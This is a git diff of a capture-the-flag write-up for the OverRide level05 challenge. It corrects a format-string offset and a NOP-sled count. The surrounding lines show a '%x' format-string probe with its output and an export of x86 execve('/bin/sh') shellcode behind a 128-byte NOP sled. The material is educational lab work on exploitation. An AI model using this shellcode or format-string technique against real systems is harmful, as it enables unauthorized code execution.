@@ -94,7 +94,7 @@ level05@OverRide:~$ ./level05
 AAAA %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x
 aaaa 64 f7fcfac0 f7ec3af9 ffffd66f ffffd66e 0 ffffffff ffffd6f4 f7fdb000 61616161 20782520 25207825 78252078 20782520 25207825
 ```
-We can see that the first argument is located at the 11th position.
+We can see that the first argument is located at the 10th position.
 
 ### 5.2. Find the Address of the `exit` Function
 
@@ -123,7 +123,7 @@ We will export the shellcode to an environment variable.
 ```bash
 export SHELLCODE=`python -c 'print "\x90" * 128 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"'`
 ```
-We add 100 NOPs before the shellcode to ensure that the shellcode is executed.
+We add 128 NOPs before the shellcode to ensure that the shellcode is executed.
 
 Now, we will search for the address of the environment variable.
 
